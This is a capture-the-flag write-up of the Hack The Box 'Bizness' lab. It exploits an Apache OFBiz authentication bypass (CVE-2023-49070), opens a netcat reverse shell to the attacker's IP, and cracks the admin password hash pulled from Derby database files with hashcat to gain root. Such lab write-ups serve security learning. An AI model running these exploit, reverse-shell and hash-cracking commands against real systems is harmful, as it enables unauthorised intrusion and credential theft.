---
title: Bizness
tags:
  - Linux
  - Apache
  - Brute-Forcing
---
![](Pasted%20image%2020240501195939.png)

## Reconnaissance

Firstly, I added the new host to my known ones:

```shell
sudo echo "10.10.59.31 headless.htb" | sudo tee -a /etc/hosts
```

Secondly, I started performing an `Nmap` scan with:

```shell
nmap -sC -T4 -p- headless.htb > sC.txt

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-01 18:33 CEST
Nmap scan report for bizness.htb (10.10.11.252)
Host is up (0.041s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp    open  http
|_http-title: Did not follow redirect to https://bizness.htb/
443/tcp   open  https
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Not valid before: 2023-12-14T20:03:40
|_Not valid after:  2328-11-10T20:03:40
| tls-alpn: 
|_  http/1.1
|_http-title: BizNess Incorporated
| tls-nextprotoneg: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
39467/tcp open  unknown
```

Then I went to take a look to the webpage and its code:

![](Pasted%20image%2020240501200309.png)

I did not found anything into it, so I decided to perform a `dirsearch` to the web
- More info in [dirsearch 📁](/notes/Tools/dirsearch.md)

![](Pasted%20image%2020240501200559.png)

I found the direction `/control/login`, which landed me into a login page:

![](Pasted%20image%2020240501200706.png)

> Obviously the `admin:admin` didn't work :<

After analyzing the petition with Burp and obtained nothing, I decided to search for `Apache OFBiz` and discovered the **CVE-2023-49070**

## Weaponization

Consulting in Github I found [Apache OFBiz Authentication Bypass](https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass/tree/master?tab=readme-ov-file) exploit, which I cloned and executed:

## Exploitation


```shell
python3 exploit.py --url https://bizness.htb                                         
[+] Scanning started...
[+] Apache OFBiz instance seems to be vulnerable.
```

Now I try to obtain a shell and stabylize it:
- More info in [Reverse shells 👾](/notes/reverse_shells.md)

```shell
python3 exploit.py --url https://bizness.htb --cmd 'nc -e /bin/bash 10.10.14.110 666'
```

And I got a shell:

```shell
└─$ nc -lvp 777
listening on [any] 777 ...
connect to [10.10.14.110] from bizness.htb [10.10.11.252] 60690
python3 -c "import pty; pty.spawn('/bin/bash')"
ofbiz@bizness:/opt/ofbiz$ export TERM=xterm
export TERM=xterm
ofbiz@bizness:/opt/ofbiz$ ^Z
zsh: suspended  nc -lvp 777
                                                                                                                    
┌──(gitblanc㉿playbook)-[~/HackTheBox]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvp 777
                             ls
APACHE2_HEADER  DOCKER.md                INSTALL              README.adoc
applications    docs                     lib                  runtime
build           framework                LICENSE              SECURITY.md
build.gradle    gradle                   linpeas.sh           settings.gradle
common.gradle   gradle.properties        NOTICE               themes
config          gradlew                  npm-shrinkwrap.json  VERSION
docker          gradlew.bat              OPTIONAL_LIBRARIES
Dockerfile      init-gradle-wrapper.bat  plugins
ofbiz@bizness:/opt/ofbiz$
```

### User flag

```shell
ofbiz@bizness:/opt/ofbiz$ cat /home/ofbiz/user.txt 
XXXXXXXXXXXXXXXXXXXXXXXX
```

## Privilege Escalation

Now, as I know that Apache OFBiz is running, i read a little their [docs](https://cwiki.apache.org/confluence/display/OFBIZ/Home), and find out that they use a Derby database, so I searched for it:

```shell
find / -type d -iname "derby" 2> /dev/null

/home/ofbiz/.gradle/caches/modules-2/files-2.1/org.apache.derby/derby
/home/ofbiz/.gradle/caches/modules-2/metadata-2.69/descriptors/org.apache.derby/derby
/opt/ofbiz/runtime/data/derby
```

I found a binary and a lot of `.dat` files on the `/seg0` directory, so I tried to find the admin password by using the following command:

```shell
find *.dat | xargs grep -a -i "currentPassword="
c54d0.dat:  
<eeval-UserLogin createdStamp="2023-12-16 03:40:23.643" createdTxStamp="2023-12-16 03:40:23.445" currentPassword="$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I" enabled="Y" hasLoggedOut="N" lastUpdatedStamp="2023-12-16 03:44:54.272" lastUpdatedTxStamp="2023-12-16 03:44:54.213" requirePasswordChange="N" userLoginId="admin"/>
```

> It also works by doing `strings dir.txt | grep SHA`, but you should have known previously the format of the hash

As I didn't know the hashing function, I went to see the source code of [Apache OFBiz](https://github.com/apache/ofbiz/blob/trunk/framework/base/src/main/java/org/apache/ofbiz/base/crypto/HashCrypt.java) and found the hash function that first performed a hex Encoding and then a base64 encoding:

![](Pasted%20image%2020240501203114.png)

![](Pasted%20image%2020240501203204.png)

Then, after knowing this I decoded it on [Cyberchef](https://cyberchef.org/)

![](Pasted%20image%2020240501203313.png)

Now I did brute force to it using **Hashcat** (using `d` as the salt):
- For more info check [Crack Password Hashes (Sites) 🤡](/notes/crack_password_hashes.md)

```shell
hashcat -a 0 -m 120 b8fd3f41a541a435857a8f3e751cc3a91c174362:d /usr/share/wordlists/rockyou.txt --show

b8fd3f41a541a435857a8f3e751cc3a91c174362:d:monkeybizness
```

Now I logged as root and got the flag:

```shell
su root

cat /root/root.txt
XXXXXXXXXXXXXXXXXXXXXXXX
```

==Machine pwned==
